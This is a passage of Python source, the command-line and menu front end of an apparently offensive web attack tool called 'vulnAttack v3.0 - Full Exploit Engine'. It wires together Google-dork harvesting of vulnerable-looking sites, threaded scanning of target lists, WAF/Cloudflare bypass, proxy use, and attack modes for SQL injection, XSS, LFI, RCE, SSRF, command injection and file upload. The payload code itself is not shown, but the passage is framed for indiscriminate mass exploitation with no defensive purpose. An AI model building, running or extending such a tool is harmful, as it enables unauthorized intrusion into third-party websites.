def scan_single(target, pl, tl, use_proxy=False, bypass_waf=False):
    try:
        scanner = VulnAttack(target, pl, tl, use_proxy, bypass_waf)
        scanner.run()
        return True
    except Exception as e:
        print_progress(f"Error on {target}: {e}", 'error')
        return False

# ================================================================
# MAIN
# ================================================================
def main():
    for d in ['logs', 'results', 'config', 'templates', 'bypass', 'payloads']:
        os.makedirs(d, exist_ok=True)

    bypass_waf = '--bypass-waf' in sys.argv
    use_proxy = '--proxy' in sys.argv
    deep_scan = '--deep-scan' in sys.argv or '--audit' in sys.argv
    attack_category = None
    if '--attack' in sys.argv:
        try:
            idx = sys.argv.index('--attack')
            attack_category = sys.argv[idx+1].lower()
        except IndexError:
            print_progress("Error: --attack requires a category argument.", 'error')
            print("Available categories: sqli, xss, lfi, rce, ssrf, xxe, nosqli, ssti, cmd_injection, ldap, open_redirect, csrf, file_upload, directories")
            sys.exit(1)
        valid_categories = list(ATTACK_DESCRIPTIONS.keys())
        if attack_category not in valid_categories:
            print_progress(f"Invalid attack category: {attack_category}", 'error')
            print(f"Available categories: {', '.join(valid_categories)}")
            sys.exit(1)

    if '--delay' in sys.argv:
        try:
            idx = sys.argv.index('--delay')
            CONFIG['delay'] = int(sys.argv[idx+1])
        except:
            pass

    if '--output' in sys.argv:
        try:
            idx = sys.argv.index('--output')
            CONFIG['output_dir'] = sys.argv[idx+1]
        except:
            pass

    if '--menu' in sys.argv:
        sys.argv = [sys.argv[0]]

    if len(sys.argv) < 2:
        print(BANNER)
        print(f"""
\033[92m[+] INSTALLATION COMPLETE!
\033[93m[+] You can now run:
\033[96m  python vulnAttack.py http://target.com
\033[96m  python vulnAttack.py --dork "inurl:index.php?id="
\033[96m  python vulnAttack.py --list targets.txt --threads 20
\033[96m  python vulnAttack.py --bypass-waf --dork ...
\033[96m  python vulnAttack.py --proxy --list targets.txt
\033[96m  python vulnAttack.py --attack sqli http://target.com
\033[95m[+] MAIN MENU
\033[97m  [1] Scan target         (masukkan URL)
\033[97m  [2] Dorking             (masukkan dork)
\033[97m  [3] Scan list target    (masukkan file target)
\033[97m  [4] Help                (tampilkan bantuan)
\033[97m  [5] Exit                (keluar)
\033[0m""")
        while True:
            print_section("MAIN MENU")
            print("  [1] Scan Target")
            print("  [2] Dorking")
            print("  [3] Scan List Target")
            print("  [4] Help")
            print("  [5] Exit")
            choice = input("[?] Choose (1-5): ").strip()
            if choice == '1':
                target = input("[?] Enter target URL: ").strip()
                if not target.startswith('http'):
                    target = 'http://' + target
                use_proxy_opt = input("[?] Use proxy? (y/n): ").strip().lower() == 'y'
                bypass_opt = input("[?] Bypass WAF/Cloudflare? (y/n): ").strip().lower() == 'y'
                deep_opt = input("[?] Deep Scan? (y/n): ").strip().lower() == 'y'
                attack_opt = input("[?] Attack category (leave blank for all): ").strip().lower()
                pl = PayloadLoader()
                tl = TemplateLoader()
                scanner = VulnAttack(target, pl, tl, use_proxy_opt, bypass_opt, attack_opt if attack_opt else None)
                if deep_opt:
                    scanner.deep_audit()
                scanner.run()
            elif choice == '2':
                dork = input("[?] Enter dork: ").strip()
                if dork:
                    use_proxy_opt = input("[?] Use proxy? (y/n): ").strip().lower() == 'y'
                    bypass_opt = input("[?] Bypass WAF/Cloudflare? (y/n): ").strip().lower() == 'y'
                    pl = PayloadLoader()
                    tl = TemplateLoader()
                    dummy = VulnAttack('http://dummy.com', pl, tl, use_proxy_opt, bypass_opt)
                    targets = dummy.dork_engine.dork_all(dork, 50)
                    for t in targets:
                        print(f"  {t}")
            elif choice == '3':
                file_path = input("[?] Enter target file path: ").strip()
                if os.path.exists(file_path):
                    with open(file_path, 'r') as f:
                        targets = [line.strip() for line in f if line.strip()]
                    print_progress(f"Loaded {len(targets)} targets", 'info')
                    threads = input("[?] Threads (default 10): ").strip()
                    threads = int(threads) if threads.isdigit() else 10
                    use_proxy_opt = input("[?] Use proxy? (y/n): ").strip().lower() == 'y'
                    bypass_opt = input("[?] Bypass WAF/Cloudflare? (y/n): ").strip().lower() == 'y'
                    scan_multiple(targets, threads, use_proxy_opt, bypass_opt)
                else:
                    print_progress("File not found!", 'error')
            elif choice == '4':
                print("Help:\n  python vulnAttack.py <target_url>\n  python vulnAttack.py --dork <dork>\n  python vulnAttack.py --list <file> [--threads N]\n  python vulnAttack.py --bypass-waf\n  python vulnAttack.py --proxy\n  python vulnAttack.py --deep-scan\n  python vulnAttack.py --audit\n  python vulnAttack.py --attack <category> <target_url>\n  python vulnAttack.py --delay N\n  python vulnAttack.py --output <dir>")
            elif choice == '5':
                print_progress("Goodbye!", 'info')
                sys.exit(0)
            else:
                print_progress("Invalid choice!", 'error')
        return

    pl = PayloadLoader()
    tl = TemplateLoader()

    if sys.argv[1] == '--dork':
        if len(sys.argv) < 3:
            print_progress("Enter dork.", 'error')
            sys.exit(1)
        dork = sys.argv[2]
        dummy = VulnAttack('http://dummy.com', pl, tl, use_proxy, bypass_waf)
        targets = dummy.dork_engine.dork_all(dork, 50)
        for t in targets:
            print(t)
        sys.exit(0)

    elif sys.argv[1] == '--list':
        if len(sys.argv) < 3:
            print_progress("Enter target file.", 'error')
            sys.exit(1)
        file_target = sys.argv[2]
        if not os.path.exists(file_target):
            print_progress("File not found!", 'error')
            sys.exit(1)
        with open(file_target, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        threads = CONFIG['threads']
        if '--threads' in sys.argv:
            try:
                idx = sys.argv.index('--threads')
                threads = int(sys.argv[idx+1])
            except:
                pass
        scan_multiple(targets, threads, use_proxy, bypass_waf)
        sys.exit(0)

    elif sys.argv[1] == '--help':
        print("""
vulnAttack v3.0 - Full Exploit Engine
Options:
  <target_url>                     : Scan single target (all attacks)
  --attack <category> <target_url> : Scan only one attack category
  --dork <dork>                    : Multi-Dorking
  --list <file>                    : Scan multiple targets from file
  --threads N                      : Number of threads (default 10)
  --bypass-waf                     : Enable WAF/Cloudflare bypass
  --proxy                          : Enable proxy (requires config/proxy.txt)
  --deep-scan                      : Enable deep analysis (crawl deeper, hidden findings)
  --audit                          : Extreme audit (same as deep-scan)
  --delay N                        : Delay between requests in seconds (default 1)
  --output <dir>                   : Output directory (default: results)
  --menu                           : Force interactive menu
  --help                           : Show this help

Available attack categories:
  sqli, xss, lfi, rce, ssrf, xxe, nosqli, ssti, cmd_injection,
  ldap, open_redirect, csrf, file_upload, directories
""")
        sys.exit(0)

    else:
        target = sys.argv[1]
        if not target.startswith('http'):
            target = 'http://' + target
        scanner = VulnAttack(target, pl, tl, use_proxy, bypass_waf, attack_category)
        if deep_scan:
            scanner.deep_audit()
        scanner.run()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)
